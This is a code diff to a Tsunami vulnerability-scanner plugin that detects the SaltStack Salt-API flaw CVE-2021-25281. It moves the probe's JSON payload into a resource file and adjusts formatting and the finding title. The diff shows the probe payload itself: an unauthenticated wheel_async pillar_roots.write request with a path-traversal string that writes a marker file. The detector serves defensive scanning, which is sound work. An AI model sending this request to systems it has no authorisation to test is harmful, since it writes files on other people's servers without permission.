@@ -3,9 +3,11 @@ package com.google.tsunami.plugins.detectors.saltstack.cve202125281;
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
+import static java.nio.charset.StandardCharsets.UTF_8;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.io.Resources;
 import com.google.common.net.MediaType;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
@@ -54,11 +56,21 @@ public class SaltStackCVE202125281VulnDetector implements VulnDetector {
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private final String payloadFormatString;
 
   @Inject
   SaltStackCVE202125281VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
+    String payloadFormatString = "";
+    try {
+      payloadFormatString = Resources.toString(
+          Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8);
+    } catch (IOException e) {
+      logger.atSevere().withCause(e).log(
+          "Should never happen. Couldn't load payload resource file");
+    }
+    this.payloadFormatString = payloadFormatString;
   }
 
   @Override
@@ -79,10 +91,8 @@ public class SaltStackCVE202125281VulnDetector implements VulnDetector {
     HttpHeaders httpHeaders = HttpHeaders.builder()
         .addHeader(com.google.common.net.HttpHeaders.CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
         .build();
-    ByteString httpBody = ByteString.copyFromUtf8(
-        "{\"eauth\": \"auto\", \"client\": \"wheel_async\", "
-            + "\"fun\": \"pillar_roots.write\", \"data\": \"test\", \"path\": "
-            + "\"../../../../../../../../../../../../../../../../../../tmp/success\"}");
+    String filePath = "../../../../../../../../../../../../../../../../../../tmp/success";
+    ByteString httpBody = ByteString.copyFromUtf8(String.format(payloadFormatString, filePath));
     try {
       HttpResponse response = httpClient.send(
           post(targetUri).withEmptyHeaders().setHeaders(httpHeaders).setRequestBody(httpBody)
@@ -93,8 +103,8 @@ public class SaltStackCVE202125281VulnDetector implements VulnDetector {
         if (!jsonElement.isJsonObject()) {
           return false;
         }
-        if (!jsonElement.getAsJsonObject().has("return") ||
-            !jsonElement.getAsJsonObject().get("return").isJsonArray()) {
+        if (!jsonElement.getAsJsonObject().has("return")
+            || !jsonElement.getAsJsonObject().get("return").isJsonArray()) {
           return false;
         }
         JsonArray returnArray = jsonElement.getAsJsonObject().get("return").getAsJsonArray();
@@ -127,8 +137,8 @@ public class SaltStackCVE202125281VulnDetector implements VulnDetector {
                     VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                         .setValue("CVE_2021_25281"))
                 .setSeverity(Severity.HIGH)
-                .setTitle(
-                    "SaltStack Salt-API Unauthenticated Remote Command Execution vulnerability")
+                .setTitle("SaltStack Salt-API Unauthenticated Remote Command Execution "
+                    + "vulnerability (CVE-2021-25281)")
                 .setDescription(
                     "The SaltAPI does not honor eauth credentials for the wheel_async client. "
                         + "Thus, an attacker can remotely run any wheel modules on the master."
